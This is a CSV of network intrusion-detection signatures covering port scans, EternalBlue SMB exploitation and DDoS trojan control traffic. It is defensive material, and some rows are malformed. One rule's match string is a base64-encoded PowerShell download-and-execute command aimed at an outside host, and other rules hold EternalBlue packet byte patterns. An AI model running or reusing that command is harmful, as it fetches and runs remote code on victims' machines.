action,proto,src_ip,src_port,dest_ip,dest_port,family,behavior,description,sign_source,author,threat_judge,attack_phase,apt_org,extract_date,attack_direction,remarks,cve_number,threat_level,threat_type,id,refer,payload,classtype,sid,rev,metadata
alert,tcp,$EXTERNAL_NET,any,$HOME_NET,445,,['PortScan'],ET SCAN DCERPC rpcmgmt ifids Unauthenticated BIND,ArtificialExtraction,suricata,Threat,Prepare,,20100730,{'Source': 'Attacker'; 'Obj': 'Victim'},,,IntermediateRisk,['Scan'],102009832,[],flow:established;to_server; content:"|05|"; content:"|80 bd a8 af 8a 7d c9 11 be f4 08 00 2b 10 29 89|"; distance:31; reference:url;www.symantec.com/avcenter/reference/Vista_Network_Attack_Surface_RTM.pdf; reference:url;www.blackhat.com/presentations/win-usa-04/bh-win-04-seki-up2.pdf; reference:url;seclists.org/fulldisclosure/2003/Aug/0432.html; reference:url;doc.emergingthreats.net/2009832; classtype:Scan; sid:102009832; rev:3;),classtype:Scan;,id:102009832;,rev:3;,metadata:created_at 2010_07_30; updated_at 2010_07_30;
alert,tcp,any,any,any,any,Unknown,['AccessC2'],test ghost,ArtificialExtraction,DC,Threat,Control,,20190327,{'Source': 'Attacker'; 'Obj': 'Victim'},ghost,,HighRisk,['RAT'],2019032701,[],None,classtype:RAT;,id:2019032701;,rev:1;,
alert,tcp,any,any,any,445,Unknown,['VulnerabilityIntrusion'],445 port crash attack,ArtificialExtraction,DC,Threat,Invasion,,20190327,{'Source': 'Attacker'; 'Obj': 'Victim'},,CVE-2017-0146,HighRisk,['Exploits'],2015986,[],None,classtype:Exploits;,id:2015986;,rev:5;,
alert,tcp,$HOME_NET,any,any,445,,['PortScan'],ET SCAN Behavioral Unusual Port 445 traffic Potential Scan or Infection,ArtificialExtraction,suricata,Threat,Prepare,,20170511,{'Source': 'Attacker'; 'Obj': 'Victim'},,CVE-2017-0146,IntermediateRisk,['Scan'],102001569,[],flow:to_server; flags: S;12; threshold: type both; track by_src; count 70; seconds 60;),classtype:Scan;,id:102001569;,rev:15;,metadata: former_category SCAN;metadata:created_at 2010_07_30; updated_at 2017_05_11;
alert,smb,any,any,$HOME_NET,any,,['VulnerabilityIntrusion'],ET EXPLOIT Possible ETERNALBLUE Exploit M3 CVE-2017-0146,ArtificialExtraction,suricata,Threat,Invasion,,20170627,{'Source': 'Attacker'; 'Obj': 'Victim'},,CVE-2017-0146,HighRisk,['Exploits'],102024430,[],flow:to_server;established; content:"|ff|SMB|32 00 00 00 00 18 07 c0|"; offset:4; depth:12; content:"|00 00 00 00 00 00 00 00 00 00 00 08 ff fe 00 08|"; distance:2; within:16; fast_pattern; content:"|0f 0c 00 00 10 01 00 00 00 00 00 00 00 f2 00 00 00 00 00 0c 00 42 00 00 10 4e 00 01 00 0e 00 0d 10 00|"; distance:2; within:34; isdataat:1000;relative; threshold: type both; track by_src; count 10; seconds 1;),classtype:Exploits;,id:102024430;,rev:3;,metadata: former_category EXPLOIT;metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit; attack_target Client_Endpoint; deployment Perimeter; deployment Internal; signature_severity Critical; created_at 2017_06_27; updated_at 2017_07_06;
alert,udp,$EXTERNAL_NET,any,$HOME_NET,445,,['PortScan'],ET SCAN Nessus Netbios Scanning,ArtificialExtraction,suricata,Threat,Prepare,,20121001,{'Source': 'Attacker'; 'Obj': 'Victim'},,,IntermediateRisk,['Scan'],102015754,[],content:"n|00|e|00|s|00|s|00|u|00|s"; fast_pattern:only; reference:url;www.tenable.com/products/nessus/nessus-product-overview; classtype:Scan; sid:102015754; rev:2;),classtype:Scan;,id:102015754;,rev:2;,metadata:created_at 2012_10_01; updated_at 2012_10_01;
alert,tcp,any,any,any,445,,['VulnerabilityIntrusion'],EXPLOIT drive-the-life shell code payload detect,ArtificialExtraction,ccr,Threat,Invasion,,20190417,{'Source': 'Attacker'; 'Obj': 'Victim'},,,HighRisk,['Exploits'],101904171,[],flow:to_server;established; content:"powershell -ep bypass -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdgAuAGIAZQBhAGgAaAAuAGMAbwBtAC8AdgAnACsAJABlAG4AdgA6AFUAUwBFAFIARABPAE0AQQBJAE4AKQA="; nocase; classtype:Exploits; sid:101904171; rev:4;),classtype:Exploits;,id:101904171;,rev:4;,metadata:created_at 2019_04_17; updated_at 2019_04_17;
alert,smb,any,any,$HOME_NET,any,,['VulnerabilityIntrusion'],ET EXPLOIT Possible ETERNALBLUE CVE-2017-0146 Echo Request (set),ArtificialExtraction,suricata,Threat,Invasion,,20170417,{'Source': 'Attacker'; 'Obj': 'Victim'},,CVE-2017-0146,HighRisk,['Exploits'],102024220,[],flow:to_server;established; content:"|00 00 00 31 ff|SMB|2b 00 00 00 00 18 07 c0|"; depth:16; fast_pattern; content:"|4a 6c 4a 6d 49 68 43 6c 42 73 72 00|"; distance:0; flowbits:set;ET.ETERNALBLUE; flowbits:noalert;),classtype:Exploits;,id:102024220;,rev:2;,metadata: former_category EXPLOIT;metadata:attack_target SMB_Server; deployment Internal; signature_severity Critical; created_at 2017_04_17; updated_at 2017_11_27;
#,ghost,None,None,None,None,None,None,None,None,None,None,None,None,None,None,None,None,None,None,None,None,None,None,None,None,
alert,smb,$HOME_NET,any,any,any,,['VulnerabilityIntrusion'],ET EXPLOIT Possible ETERNALBLUE CVE-2017-0146 Echo Response,ArtificialExtraction,suricata,Threat,Invasion,,20170417,{'Source': 'Victim'; 'Obj': 'Attacker'},,CVE-2017-0146,HighRisk,['Exploits'],102024218,[],flow:from_server;established; content:"|00 00 00 31 ff|SMB|2b 00 00 00 00 98 07 c0|"; depth:16; fast_pattern; content:"|4a 6c 4a 6d 49 68 43 6c 42 73 72 00|"; distance:0; flowbits:isset;ET.ETERNALBLUE;),classtype:Exploits;,id:102024218;,rev:2;,metadata: former_category EXPLOIT;metadata:attack_target SMB_Server; deployment Internal; signature_severity Critical; created_at 2017_04_17; updated_at 2017_11_27;
alert,tcp,any,any,any,23,Unknown,['VulnerabilityIntrusion'],23 port crash attack,ArtificialExtraction,DC,Threat,Invasion,,20190520,{'Source': 'Attacker'; 'Obj': 'Victim'},,,HighRisk,['Exploits'],2015987,[],None,classtype:Exploits;,id:2015987;,rev:5;,
alert,tcp,any,any,any,any,Unknown,['VulnerabilityIntrusion'],WAGO_750_881_01.09.18 Cross Site Scripting,ArtificialExtraction,DC,Threat,Invasion,,20190413,{'Source': 'Attacker'; 'Obj': 'Victim'},,,HighRisk,['Exploits'],2019041302,[],None,classtype:Exploits;,id:2019041302;,rev:1;,
#,None,None,None,None,None,None,None,None,None,None,None,None,None,None,None,None,None,None,None,None,None,None,None,None,None,
#,445,None,None,None,port,None,None,None,None,None,None,None,None,None,None,None,None,None,None,None,None,None,None,None,None,
alert,tcp,any,any,any,445,,['VulnerabilityIntrusion'],ET EXPLOIT ETERNALBLUE Exploit M2 CVE-2017-0146,ArtificialExtraction,suricata,Threat,Invasion,,20170516,{'Source': 'Attacker'; 'Obj': 'Victim'},,CVE-2017-0146,HighRisk,['Exploits'],102024297,[],flow:established;to_server; content:"|8000a80000000000000000000000000000000000ffff000000000000ffff0000000000000000000000000000000000000000000000f1dfff000000000000000020f0dfff00f1dfffffffffff600004100000000080efdfff|";),classtype:Exploits;,id:102024297;,rev:2;,metadata: former_category CURRENT_EVENTS;metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit; attack_target Client_Endpoint; deployment Perimeter; signature_severity Major; created_at 2017_05_16; performance_impact Low; updated_at 2017_07_06;
alert,tcp,any,any,any,any,Unknown,['WebApplicationAttack'],Apache Struts2 S2-057,ArtificialExtraction,WQ,Threat,Invasion,,20180827,{'Obj': 'Victim'; 'Source': 'Attacker'},Apache Struts2 S2-057,CVE-2018-11776,HighRisk,['Exploits'],130017071,[],None,classtype:Exploits;,id:130017071;,rev:1;,
alert,tcp,any,any,any,any,Unknown,['VulnerabilityIntrusion'],Command,ArtificialExtraction,WQ,Threat,Invasion,,20180719,{'Source': 'Attacker'; 'Obj': 'Victim'},SERVER-WEBAPP Belkin proxy.cgi command injection attempt,CVE-2018-1143,HighRisk,['Exploits'],130017093,[''],None,classtype:attempted-admin;,id:130017093;,rev:1;,
alert,tcp,any,any,any,any,Unknown,['SQLInjection'],ECShop 2.x/3.x SQL注入/任意代码执行漏洞,ArtificialExtraction,WQ,Threat,Invasion,,20180910,{'Obj': 'Victim'; 'Source': 'Attacker'},ECShop 2.x/3.x SQL注入/任意代码执行漏洞,,HighRisk,['Exploits'],130017097,[],None,classtype:Exploits;,id:130017097;,rev:1;,
alert,tcp,any,any,any,any,Trojan[DDoS]/Linux.BillGates,['AccessC2'],Trojan[DDoS]/Linux.BillGates,ArtificialExtraction,XUCHENG,Threat,,,20171225,{'Obj': 'Attacker'; 'Source': 'Victim'},,,HighRisk,['DDoS'],10017099,[],None,classtype:DDoS;,id: 10017099;,rev:1;,
alert,tcp,any,any,any,any,Trojan[DDoS]/Linux.BillGates,['AccessC2'],Trojan[DDoS]/Linux.BillGates,ArtificialExtraction,XUCHENG,Threat,,,20171225,{'Obj': 'Attacker'; 'Source': 'Victim'},,,HighRisk,['DDoS'],10017101,[],None,classtype:DDoS;,id: 10017101;,rev:1;,
alert,tcp,any,any,any,any,Trojan[DDoS]/Linux.DDoSSTF,['AccessC2'],Trojan[DDoS]/Linux.DDoSSTF,ArtificialExtraction,XUCHENG,Threat,,,20171225,{'Obj': 'Attacker'; 'Source': 'Victim'},,,HighRisk,['DDoS'],10017103,[],None,classtype:DDoS;,id: 10017103;,rev:1;,
alert,tcp,any,any,None,<>,Trojan[DDoS]/Linux.dinwod,['AccessC2'],Trojan[DDoS]/Linux.dinwod,ArtificialExtraction,DENGCONG,Threat,,,20171225,{'Obj': 'Attacker'; 'Source': 'Victim'},,,HighRisk,['DDoS'],10017105,[],None,classtype:DDoS;,id: 10017105;,rev:1;,
alert,tcp,any,any,any,any,Unknown,['SQLInjection'],Command,ArtificialExtraction,WQ,Threat,Invasion,,20180910,{'Source': 'Attacker'; 'Obj': 'Victim'},ECShop 2.x/3.x SQL注入/任意代码执行漏洞,,HighRisk,['Exploits'],130017107,[],None,classtype:Exploits;,id:130017107;,rev:1;,
alert,tcp,any,any,any,any,Unknown,['WebApplicationAttack'],NUUO NVRMini2 Unauthenticated Remote Stack Buffer Overflow RCE,ArtificialExtraction,WQ,Threat,Invasion,,20180928,{'Obj': 'Victim'; 'Source': 'Attacker'},NUUO NVRMini2 Unauthenticated Remote Stack Buffer Overflow RCE,CVE-2018-1149,HighRisk,['Exploits'],130017109,[],None,classtype:Exploits;,id:130017109;,rev:1;,
alert,tcp,any,any,None,<>,Trojan[DDoS]/Linux.dinwod,['AccessC2'],Trojan[DDoS]/Linux.dinwod,ArtificialExtraction,DENGCONG,Threat,,,20171225,{'Obj': 'Victim'; 'Source': 'Attacker'},,,HighRisk,['DDoS'],10017113,[],None,classtype:DDoS;,id: 10017113;,rev:1;,
alert,tcp,any,any,any,any,Trojan[DDoS]/Linux.Dofloo,['OnlineBehavior'],上线包,ArtificialExtraction,CHENPENG,Threat,,,20171225,{'Obj': 'Attacker'; 'Source': 'Victim'},上线包,,HighRisk,['DDoS'],10017115,[],None,classtype:DDoS;,id:10017115;,rev:1;,
alert,tcp,any,any,any,any,Trojan[DDoS]/Linux.Dofloo,['AccessC2'],Trojan[DDoS]/Linux.Dofloo,ArtificialExtraction,CHENPENG,Threat,,,20171225,{'Obj': 'Attacker'; 'Source': 'Victim'},,,HighRisk,['DDoS'],10017117,[],None,classtype:DDoS;,id:10017117;,rev:1;,
alert,tcp,any,any,None,<>,Trojan[DDoS]/Linux.gafgyt,['TrojanCommand'],回包,ArtificialExtraction,DENGCONG,Threat,,,20171225,{'Obj': 'Attacker'; 'Source': 'Victim'},回包,,HighRisk,['DDoS'],10017119,[],None,classtype:DDoS;,id:10017119;,rev:1;,
alert,tcp,any,any,None,<>,Trojan[DDoS]/Linux.gafgyt,['TrojanCommand'],字符串!* SCANNER ON,ArtificialExtraction,DENGCONG,Threat,,,20171225,{'Obj': 'Victim'; 'Source': 'Attacker'},字符串!* SCANNER ON,,HighRisk,['DDoS'],10017125,[],None,classtype:DDoS;,id:10017125;,rev:1;,
alert,tcp,any,any,any,any,Trojan[DDoS]/Linux.ghost,['AccessC2'],Trojan[DDoS]/Linux.ghost,ArtificialExtraction,CHENPENG,Threat,,,20171225,{'Obj': 'Victim'; 'Source': 'Attacker'},,,HighRisk,['DDoS'],10017127,[],None,classtype:DDoS;,id:10017127;,rev:1;,
alert,tcp,any,any,None,<>,Trojan[DDoS]/Linux.XorDDoS,['TrojanCommand'],Trojan[DDoS]/Linux.XorDDoS,ArtificialExtraction,DENGCONG,Threat,,,20171225,{'Obj': 'Attacker'; 'Source': 'Victim'},,,HighRisk,['DDoS'; 'RAT'],10017129,[],None,classtype:DDoS;,id:10017129;,rev:1;,
alert,tcp,any,any,None,<>,Trojan[DDoS]/Linux.XorDDoS,['OnlineBehavior'],Trojan[DDoS]/Linux.XorDDoS,ArtificialExtraction,DENGCONG,Threat,,,20171225,{'Obj': 'Attacker'; 'Source': 'Victim'},,,HighRisk,['DDoS'; 'RAT'],10017131,[],None,classtype:DDoS;,id:10017131;,rev:1;,
alert,tcp,any,any,None,<>,Trojan[DDoS]/Linux.Znaich,['OnlineBehavior'],上线包MB,ArtificialExtraction,DENGCONG,Threat,,,20171225,{'Obj': 'Attacker'; 'Source': 'Victim'},上线包MB,,HighRisk,['DDoS'; 'RAT'],10017133,[],None,classtype:DDoS;,id:10017133;,rev:1;,
alert,tcp,any,any,None,<>,Trojan[DDoS]/Linux.Znaich,['OnlineBehavior'],上线包MB/s,ArtificialExtraction,DENGCONG,Threat,,,20171225,{'Obj': 'Attacker'; 'Source': 'Victim'},上线包MB/s,,HighRisk,['DDoS'; 'RAT'],10017135,[],None,classtype:DDoS;,id:10017135;,rev:1;,
alert,tcp,any,any,None,<>,Trojan[DDoS]/Linux.Znaich,['OnlineBehavior'],上线包MK64,ArtificialExtraction,DENGCONG,Threat,,,20171225,{'Obj': 'Attacker'; 'Source': 'Victim'},上线包MK64,,HighRisk,['DDoS'; 'RAT'],10017137,[],None,classtype:DDoS;,id:10017137;,rev:1;,
alert,tcp,any,any,None,<>,Trojan[DDoS]/Linux.Znaich,['OnlineBehavior'],上线包dle,ArtificialExtraction,DENGCONG,Threat,,,20171225,{'Obj': 'Attacker'; 'Source': 'Victim'},上线包dle,,HighRisk,['DDoS'; 'RAT'],10017139,[],None,classtype:DDoS;,id:10017139;,rev:1;,
alert,tcp,any,any,None,<>,Trojan[DDoS]/Linux.Znaich,['TrojanCommand'],上线回包,ArtificialExtraction,DENGCONG,Threat,,,20171225,{'Obj': 'Victim'; 'Source': 'Attacker'},上线回包,,HighRisk,['DDoS'; 'RAT'],10017141,[],None,classtype:DDoS;,id:10017141;,rev:1;,
alert,tcp,any,any,None,<>,Trojan[DDoS]/Linux.Znaich,['AccessC2'],Trojan[DDoS]/Linux.Znaich,ArtificialExtraction,DENGCONG,Threat,,,20171225,{'Obj': 'Victim'; 'Source': 'Attacker'},,,HighRisk,['DDoS'; 'RAT'],10017143,[],None,classtype:DDoS;,id:10017143;,rev:1;,
alert,tcp,any,any,None,<>,Trojan[DDoS]/Linux.Znaich,['AccessC2'],Trojan[DDoS]/Linux.Znaich,ArtificialExtraction,DENGCONG,Threat,,,20171225,{'Obj': 'Victim'; 'Source': 'Attacker'},,,HighRisk,['DDoS'; 'RAT'],10017145,[],None,classtype:DDoS;,id:10017145;,rev:1;,
alert,tcp,any,any,None,<>,Trojan/Win32.Bagsu,['AccessC2'],Trojan/Win32.Bagsu,ArtificialExtraction,XUCHENG,Threat,Control,,20171225,{'Obj': 'Victim'; 'Source': 'Attacker'},,,HighRisk,['DDoS'; 'RAT'],10017147,[],None,classtype:DDoS;,id:10017147;,rev:1;,
alert,tcp,any,any,None,<>,Trojan/Win32.BigBadWolf.4,['AccessC2'],Trojan/Win32.BigBadWolf.4,ArtificialExtraction,XUCHENG,Threat,,,20171225,{'Obj': 'Victim'; 'Source': 'Attacker'},,,HighRisk,['DDoS'],10017149,[],None,classtype:DDoS;,id:10017149;,rev:1;,
alert,tcp,any,any,None,<>,Trojan/Win32.BigBadWolf,['OnlineBehavior'],首包上线包,ArtificialExtraction,XUCHENG,Threat,,,20171225,{'Obj': 'Attacker'; 'Source': 'Victim'},首包上线包,,HighRisk,['DDoS'],10017151,[],None,classtype:DDoS;,id:10017151;,rev:1;,
alert,tcp,any,any,any,any,Trojan/Win32.Clouds,['AccessC2'],Trojan/Win32.Clouds,ArtificialExtraction,XUCHENG,Threat,,,20171225,{'Obj': 'Attacker'; 'Source': 'Victim'},,,HighRisk,['DDoS'],10017155,[],None,classtype:DDoS;,id:10017155;,rev:1;,
alert,tcp,any,any,None,<>,Trojan[DDoS]/Win32.Palevo.A,['AccessC2'],Trojan[DDoS]/Win32.Palevo.A,ArtificialExtraction,DENGCONG,Threat,,,20171225,{'Obj': 'Attacker'; 'Source': 'Victim'},,,HighRisk,['DDoS'; 'RAT'],10017157,[],None,classtype:DDoS;,id:10017157;,rev:1;,
alert,tcp,any,any,None,<>,Trojan[DDoS]/Win32.StormDDoS.Nitol.e,['AccessC2'],Trojan[DDoS]/Win32.StormDDoS.Nitol.e,ArtificialExtraction,DENGCONG,Threat,,,20171225,{'Obj': 'Attacker'; 'Source': 'Victim'},,,HighRisk,['DDoS'; 'RAT'],10017165,[],None,classtype:DDoS;,id:10017165;,rev:1;,
alert,tcp,any,any,None,<>,Trojan[DDoS]/Win32.StormDDoS.Nitol.e,['AccessC2'],Trojan[DDoS]/Win32.StormDDoS.Nitol.e,ArtificialExtraction,DENGCONG,Threat,,,20171225,{'Obj': 'Attacker'; 'Source': 'Victim'},,,HighRisk,['DDoS'; 'RAT'],10017167,[],None,classtype:DDoS;,id:10017167;,rev:1;,
alert,tcp,any,any,None,<>,Trojan[DDoS]/Win32.StormDDoS.Nitol.g,['OnlineBehavior'],Trojan[DDoS]/Win32.StormDDoS.Nitol.g,ArtificialExtraction,DENGCONG,Threat,,,20171225,{'Obj': 'Attacker'; 'Source': 'Victim'},,,HighRisk,['DDoS'; 'RAT'],10017171,[],None,classtype:DDoS;,id:10017171;,rev:1;,
alert,tcp,any,any,None,<>,Trojan[DDoS]/Win32.StormDDoS.Nitol.g,['AccessC2'],Trojan[DDoS]/Win32.StormDDoS.Nitol.g,ArtificialExtraction,DENGCONG,Threat,,,20171225,{'Obj': 'Attacker'; 'Source': 'Victim'},,,HighRisk,['DDoS'; 'RAT'],10017173,[],None,classtype:DDoS;,id:10017173;,rev:1;,
alert,tcp,any,any,None,<>,Trojan[DDoS]/Win32.StormDDoS.Nitol.h,['OnlineBehavior'],Trojan[DDoS]/Win32.StormDDoS.Nitol.h,ArtificialExtraction,DENGCONG,Threat,,,20171225,{'Obj': 'Attacker'; 'Source': 'Victim'},,,HighRisk,['DDoS'; 'RAT'],10017175,[],None,classtype:DDoS;,id:10017175;,rev:1;,
alert,tcp,any,any,None,<>,Trojan[DDoS]/Win32.StormDDoS.Nitol.h,['AccessC2'],Trojan[DDoS]/Win32.StormDDoS.Nitol.h,ArtificialExtraction,DENGCONG,Threat,,,20171225,{'Obj': 'Attacker'; 'Source': 'Victim'},,,HighRisk,['DDoS'; 'RAT'],10017177,[],None,classtype:DDoS;,id:10017177;,rev:1;,
alert,tcp,any,any,None,<>,Trojan[DDoS]/Win32.StormDDoS,['AccessC2'],Trojan[DDoS]/Win32.StormDDoS,ArtificialExtraction,DENGCONG,Threat,,,20171225,{'Obj': 'Victim'; 'Source': 'Attacker'},,,HighRisk,['DDoS'; 'RAT'],10017181,[],None,classtype:DDoS;,id:10017181;,rev:1;,
alert,tcp,any,any,None,<>,Trojan[DDoS]/Win32.StormDDoS,['AccessC2'],Trojan[DDoS]/Win32.StormDDoS,ArtificialExtraction,DENGCONG,Threat,,,20171225,{'Obj': 'Attacker'; 'Source': 'Victim'},,,HighRisk,['DDoS'; 'RAT'],10017183,[],None,classtype:DDoS;,id:10017183;,rev:1;,
alert,tcp,any,any,None,<>,Trojan[DDoS]/Win32.StormDDoS,['AccessC2'],Trojan[DDoS]/Win32.StormDDoS,ArtificialExtraction,DENGCONG,Threat,,,20171225,{'Obj': 'Attacker'; 'Source': 'Victim'},,,HighRisk,['DDoS'; 'RAT'],10017185,[],None,classtype:DDoS;,id:10017185;,rev:1;,
alert,tcp,any,any,None,<>,Trojan[DDoS]/Win32.StormDDoS,['AccessC2'],Trojan[DDoS]/Win32.StormDDoS,ArtificialExtraction,DENGCONG,Threat,,,20171225,{'Obj': 'Attacker'; 'Source': 'Victim'},,,HighRisk,['DDoS'; 'RAT'],10017187,[],None,classtype:DDoS;,id:10017187;,rev:1;,
alert,tcp,any,any,None,<>,Trojan[DDoS]/Win32.StormDDoS.Nitol.m,['AccessC2'],上线3389,ArtificialExtraction,DENGCONG,Threat,,,20171225,{'Obj': 'Attacker'; 'Source': 'Victim'},上线3389,,HighRisk,['DDoS'; 'RAT'],10017191,[],None,classtype:DDoS;,id:10017191;,rev:1;,
